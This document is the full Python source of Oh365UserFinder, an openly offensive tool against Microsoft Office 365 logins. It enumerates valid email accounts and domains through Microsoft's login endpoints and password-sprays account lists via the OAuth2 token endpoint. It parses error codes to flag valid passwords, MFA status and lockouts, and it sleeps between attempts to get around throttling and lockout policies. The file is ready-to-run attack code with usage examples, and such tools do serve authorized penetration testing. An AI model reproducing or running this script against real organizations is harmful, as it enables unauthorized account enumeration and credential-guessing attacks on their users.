#!/usr/bin/python3

import requests as o365request
import argparse
import time
import re
import textwrap
import sys
from colorama import Fore, Style, init


def definitions():
    global info, close, success, fail
    info, fail, close, success = Fore.YELLOW + Style.BRIGHT, Fore.RED + \
        Style.BRIGHT, Style.RESET_ALL, Fore.GREEN + Style.BRIGHT


def banner():
    print(Fore.YELLOW + Style.BRIGHT + "")
    print("   ____  __   _____ _____ ______   __  __                  _______           __          ")
    print("  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____")
    print(" / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ ")
    print("/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     ")
    print("\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     \n")
    print("                                   Version 1.1.2                                         ")
    print("                               A project by The Mayor                                    ")
    print("                        Oh365UserFinder.py -h to get started                            \n" + Style.RESET_ALL)
    print("-" * 90)


def options():
    opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        '''---Validate a Domain Name in O365---
python3 Oh365Finder.py -d mayorsec.com\n
---Validate a single email---
python3 Oh365UserFinder.py -e test@test.com\n
---Validate a list of emails and write to file---
python3 Oh365UserFinder.py -r testemails.txt -w valid.txt\n
---Validate a list of emails, write to file and timeout between requests---
python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30\n
---Validate a list of emails and write to CSV---
python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30\n
---Password Spray a list of emails using GRAPH--- (Can be used to identify valid account credentials with MFA enabled)
python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname>\n
---Password Spray a list of emails using GRAPH with lockout policy timer---
python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout <time>\n

'''))
    opt_parser.add_argument(
        '-d', '--domain', help='Validate if a domain exists')
    opt_parser.add_argument(
        '-e', '--email', help='Runs o365UserFinder against a single email')
    opt_parser.add_argument(
        '-r', '--read', help='Reads email addresses from file')
    opt_parser.add_argument(
        '-t', '--timeout', help='Set timeout between checks to avoid false positives')
    opt_parser.add_argument(
        '-w', '--write', help='Writes valid emails to text file')
    opt_parser.add_argument(
        '-c', '--csv', help='Writes valid emails to a .csv file')
    opt_parser.add_argument(
        '-v', '--verbose', help='Prints output verbosely', action='store_true')
    opt_parser.add_argument(
        '-gs', '--pwspray', help='Password sprays a list of accounts using GRAPH', action='store_true')
    opt_parser.add_argument(
        '-l', '--lockout', help='Sets the lockout timer if known (in minutes)')

    # opt_parser.add_argument(
    #     '-ps', '--pwspray', help='Password sprays a list of accounts using RST', action='store_true')
    opt_parser.add_argument('-p', '--password', help='Password to be tested')
    opt_parser.add_argument('-el', '--elist', help='Valid emails to be tested')
    global args
    args = opt_parser.parse_args()
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()


ms_url = 'https://login.microsoftonline.com/common/GetCredentialType'


def main():
    if args.timeout is not None:
        print(
            info + f'[info] Timeout set to {args.timeout} seconds between requests.\n' + close)
    counter = 0
    timeout_counter = 0
    print(Fore.YELLOW + Style.BRIGHT +
          f'\n[info] Starting Oh365 User Finder at {time.ctime()}\n' + Style.RESET_ALL)
    if args.email is not None:
        email = args.email
        s = o365request.session()
        body = '{"Username":"%s"}' % email
        request = o365request.post(ms_url, data=body)
        response_dict = request.json()
        response = request.text
        valid_response = re.search('"IfExistsResult":0,', response)
        valid_response5 = re.search('"IfExistsResult":5,', response)
        valid_response6 = re.search('"IfExistsResult":6,', response)
        invalid_response = re.search('"IfExistsResult":1,', response)
        desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
        throttling = re.search('"ThrottleStatus":1', response)
        if args.verbose:
            print('\n', email, s, body, request, response_dict, response, valid_response,
                  valid_response5, valid_response6, invalid_response, desktopsso_response,'\n')
        if desktopsso_response and not valid_response or valid_response5 or valid_response6:
            a = email
            b = " Result -  Desktop SSO Enabled [!]"
            print(
                info + f'[!] {a:51} {b} ' + close)
        if invalid_response and not desktopsso_response:
            a = email
            b = " Result - Invalid Email Found! [-]"
            print(fail + f"[-] {a:51} {b}" + close)
        if valid_response or valid_response5 or valid_response6:
            a = email
            b = " Result -   Valid Email Found! [+]"
            print(success + f"[+] {a:53} {b} " + close)
        if throttling:
            print(
                fail + "\n[warn] Results suggest O365 is responding with false positives. Retry the scan in 60 seconds." + close)
            sys.exit()
        if args.timeout is not None:
            time.sleep(int(args.timeout))

    elif args.read is not None:
        with open(args.read) as input_emails:
            for line in input_emails:
                s = o365request.session()
                email_line = line.split()
                email = ' '.join(email_line)
                body = '{"Username":"%s"}' % email
                request = o365request.post(ms_url, data=body)
                response = request.text
                valid_response = re.search('"IfExistsResult":0,', response)
                valid_response5 = re.search('"IfExistsResult":5,', response)
                valid_response6 = re.search('"IfExistsResult":6,', response)
                invalid_response = re.search('"IfExistsResult":1,', response)
                throttling = re.search('"ThrottleStatus":1', response)
                desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
                if args.verbose:
                    print('\n', s, email_line, email, body, request, response, valid_response,
                          valid_response5, valid_response6, invalid_response, desktopsso_response,'\n')
                if desktopsso_response:
                    a = email
                    b = " Result -  Desktop SSO Enabled [!]"
                    print(
                        info + f'[!] {a:51} {b} ' + close)
                if invalid_response and not desktopsso_response:
                    a = email
                    b = " Result - Invalid Email Found! [-]"
                    print(fail + f"[-] {a:51} {b}" + close)
                if valid_response or valid_response5 or valid_response6:
                    a = email
                    b = " Result -   Valid Email Found! [+]"
                    print(success + f"[+] {a:51} {b}" + close)
                    counter = counter + 1
                    if args.write is not None:
                        a = email
                        with open(args.write, 'a+') as valid_emails_file:
                            valid_emails_file.write(f"{a}\n")
                    elif args.csv is not None:
                        a = email
                        with open(args.csv, 'a+') as valid_emails_file:
                            valid_emails_file.write(f"{a}\n")
                if throttling:
                    if args.timeout is not None:
                        timeout_counter = timeout_counter + 1
                        if timeout_counter == 5:
                            print(
                                fail + f'\n[warn] Results suggest O365 is responding with false positives.')
                            print(
                                fail + f'\n[warn] O365 has returned five false positives.\n')
                            print(
                                info + f'[info] Oh365UserFinder setting timeout to 10 minutes. You can exit or allow the program to continue running.')
                            time.sleep(int(300))
                            print(info + f'\nScanning will continue in 5 minutes.')
                            time.sleep(int(270))
                            print(info + f'\nContinuing scan in 30 seconds.')
                            time.sleep(int(30))
                            timeout_counter = 0
                            # sys.exit()
                        else:
                            print(
                                fail + f"\n[warn] Results suggest O365 is responding with false positives. Sleeping for {args.timeout} seconds before trying again.\n")
                            time.sleep(int(args.timeout))

                    else:
                        print(
                            fail + "\n[warn] Results suggest O365 is responding with false positives. Restart scan and use the -t flag to slow request times." + close)
                        sys.exit()
                if args.timeout is not None:
                    time.sleep(int(args.timeout))
            if counter == 0:
                print(
                    fail + '\n[-] There were no valid logins found. [-]' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
            elif counter == 1:
                print(
                    info + '\n[info] Oh365 User Finder discovered one valid login account.' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
            else:
                print(
                    info + f'\n[info] Oh365 User Finder discovered {counter} valid login accounts.\n' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)

    elif args.domain is not None:
        domain_name = args.domain
        print(
            info + f"[info] Checking if the {domain_name} exists...\n" + close)
        url = (
            f"https://login.microsoftonline.com/getuserrealm.srf?login=user@{domain_name}")
        request = o365request.get(url)
        # print(request)
        response = request.text
        # print(response)
        valid_response = re.search('"NameSpaceType":"Managed",', response)
        valid_response1 = re.search('"NameSpaceType":"Federated",', response)
        if args.verbose:
            print(domain_name, request, response, valid_response)
        if valid_response:
            print(
                success + f"[success] The listed domain {domain_name} exists. Domain is Managed.\n" + close)
        elif valid_response1:
            print(
                success + f"[success] The listed domain {domain_name} exists. Domain is Federated.\n" + close)
        else:
            print(
                fail + f"[info] The listed domain {domain_name} does not exist.\n" + close)
        print(info + f'[info] Scan completed at {time.ctime()}' + close)
    elif args.pwspray:
        lockout_counter = 0
        with open(args.elist) as input_emails:
            for line in input_emails:
                email_line = line.split()
                email = ' '.join(email_line)
                password = args.password
                s = o365request.session()
                body = 'grant_type=password&password=' + password + '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
                    email + '&resource=https://graph.windows.net&client_info=1&scope=openid'
                requestURL = "https://login.microsoft.com/common/oauth2/token"
                request = o365request.post(requestURL, data=body)
                response = request.text
                valid_response = re.search('53003', response)
                account_doesnt_exist = re.search('50034', response)
                account_invalid_password = re.search('50126', response)
                account_disabled = re.search(
                    'The user account is disabled', response)
                valid_response1 = re.search('7000218', response)
                password_expired = re.search('50055', response)
                account_locked_out = re.search('50053', response)
                mfa_true = re.search('50076', response)
                mfa_true1 = re.search('50079', response)
                desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
                conditional_access = re.search('50158', response)
                if args.verbose:
                    print('\n', email, s, email_line, email, body, request, response, valid_response, account_doesnt_exist, account_invalid_password, account_disabled, valid_response1, password_expired, account_locked_out, mfa_true, mfa_true1, desktopsso_response, conditional_access, '\n')                
                if valid_response:
                    counter = counter + 1
                    b = success + "Result - " + " "*1 + "VALID PASSWORD! [+]"
                    print(
                        success + f"[+] {email:44} {b}" + close)
                if valid_response1:
                    counter = counter + 1
                    b = success + "Result - " + " "*15 + "VALID PASSWORD! [+]"
                    print(
                        success + f"[+] {email:44} {b}" + close)
                if account_doesnt_exist:
                    b = " Result - " + " "*14 + "Invalid Account! [-]"
                    print(fail + f"[-] {email:43} {b}" + close)
                if account_disabled:
                    b = "Result - " + " "*13 + "Account disabled. [!]"
                    print(info + f"[!] {email:44} {b}" + close)
                if account_locked_out:
                    b = "Result - " + " "*13 + "LOCKOUT DETECTED! [!]"
                    print(info + f"[!] {email:44} {b}" + close)
                    lockout_counter = lockout_counter + 1   
                    if args.lockout:
                        lock_time = args.lockout
                        lockout = int(lock_time)
                    if args.lockout is None:
                        lock_time = 1                     
                        lockout = int(lock_time) * 60
                    if lockout_counter == 3:
                        print(fail + f'\n[warn] Multiple lockouts detected.\n')
                        print(info + f"Waiting {lockout} seconds before continuing.")
                        time.sleep(int(lockout))
                        timeout_counter = 0
                        lockout_counter = 0
                if desktopsso_response:
                    a = email
                    b = " Result -  Desktop SSO Enabled [!]"
                    print(
                        info + f'[!] {a:51} {b} ' + close)
                if account_invalid_password:
                    a = email
                    b = " Result - " + " "*10 + "Invalid Credentials! [-]"
                    print(fail + f"[-] {email:43} {b}" + close)
                if password_expired:
                    a = email
                    b = " Result - " + " "*7 + "Expired - Try Resetting [!]"
                    counter = counter + 1
                    print(info + f"[!] {email:43} {b}" + close)
                if mfa_true:
                    counter = counter + 1
                    a = email
                    b = "Result -   VALID PASSWORD - MFA ENABLED [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if mfa_true1:
                    counter = counter + 1
                    a = email
                    b = "Result - MFA ENABLED NOT YET CONFIGURED [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if conditional_access:
                    counter = counter + 1
                    a = email
                    b = "Result - Duo MFA or other conditional access [+]"
                    print(success + f"[!] {email:44} {b}" + close)
                if args.timeout is not None:
                    time.sleep(int(args.timeout))

            if counter == 0:
                print(
                    fail + '\n[-] There were no valid logins found. [-]' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
            elif counter == 1:
                print(
                    info + '\n[info] Oh365 User Finder discovered one valid credential pair.' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
            else:
                print(
                    info + f'\n[info] Oh365 User Finder discovered {counter} valid credential pairs.\n' + close)
                print(
                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
    else:
        sys.exit()

def new_func():
    return 60


if __name__ == "__main__":
    try:
        init()
        definitions()
        banner()
        options()
        main()

    except KeyboardInterrupt:
        print("\nYou either fat fingered this, or meant to do it. Either way, goodbye!")
        quit()
